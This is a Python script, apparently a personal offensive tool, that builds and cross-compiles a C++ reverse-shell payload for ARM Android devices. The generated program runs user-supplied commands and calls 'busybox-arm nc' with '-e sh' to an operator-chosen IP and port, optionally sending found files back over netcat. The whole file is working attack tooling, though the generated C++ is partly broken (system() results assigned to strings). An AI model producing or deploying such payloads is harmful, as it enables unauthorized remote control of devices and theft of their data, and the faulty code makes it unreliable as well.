# Created: 1/30/2019
# Last Update: 1/30/2019
# Written By: David Pruitt
# Description: This file will create and compile a cpp executable based on specifics that need to be returned.
# This is a work in progress and will be updated when newer functions are needed.

import argparse
import os

def main():
    parser = argparse.ArgumentParser(description='Generates reverse shell payload for desired architecture.')
    parser.add_argument('-c', type=str,  default='', help='Add command to payload', dest='command', required=False)
    parser.add_argument('-f', type=str,  default='', help='Add find to netcat. Specifiy file', dest='findChoice', required=False)
    parser.add_argument('-d', type=str,  default='', help='Returns a directory listing. Specify directory needed', dest='directory', required=False)
    parser.add_argument('-r', type=int,  default=0,  help='0 Returns info through kernel. 1 Returns all in a file.', dest='returned', required=False)
    parser.add_argument('-p', type=str,  default=None, help='Ip & Port returned on. (space seperated)', dest='payloadIPPort', required=True)
    parser.add_argument('-o', type=str,  default="execute-command", help='Payload output name', dest='payloadName', required=True)


    args = parser.parse_args()

    decide_Build(args.command, args.findChoice, args.directory, args.payloadIPPort)
    build_cpp(args.payloadName)
    return

# This decides given arguments what will be build
def decide_Build(command, findChoice, directory, IpPort):
    #Defaults incase it is not used
    commandPT = ''
    findPT = ''
    direcPT = ''
    netcatPT = ''

    #for cpp readability
    tab = '    '

    #Base and End are the static file portions around commands
    base = """#include <stdio.h>
#include <unistd.h>
#include <iostream>
#include <string>
#include <fstream>\n
using namespace std;\n
int main(){\n"""

    end = """
    return 0;
}"""

    #Adds command string to file
    if (command != ''):
        commandPT = tab + "string cmd = system((\"" + command + "\").c_str()); \n"
    
    #Adds find command for later use(returns through netcat)
    if (findChoice != ''):
        findPT = tab + "string find = system((\"find \ -n '" + findChoice + "'\").c_str());\n"
    
    #Adds return directory listing (from user specified location)
    if (directory != ''):
        direcPT = tab + "string directory = system((\"ls -d '" + directory + "'\").c_str());\n"
    
    #Creates a netcat file return or a reverse shell
    if (findChoice != ''):
        netcatPT = tab + "system((\"./busybox-arm nc " + IpPort + " -e sh < \" + find).c_str());\n"
    else:
        netcatPT = tab + "system((\"./busybox-arm nc " + IpPort + " -e sh\").c_str());\n"

    #Creates c++ file
    fileComplete = base + commandPT + findPT + direcPT + netcatPT + end

    #Write Cpp File
    f = open("payload-templates/netcat.cpp", "w")
    f.write(fileComplete)
    f.close()
    
    return


def build_cpp(fileName):
    os.system("./bin/arm/bin/arm-linux-androideabi-clang++ -static-libstdc++ payload-templates/netcat.cpp -o" + fileName)
    return


if __name__ == "__main__":
    main()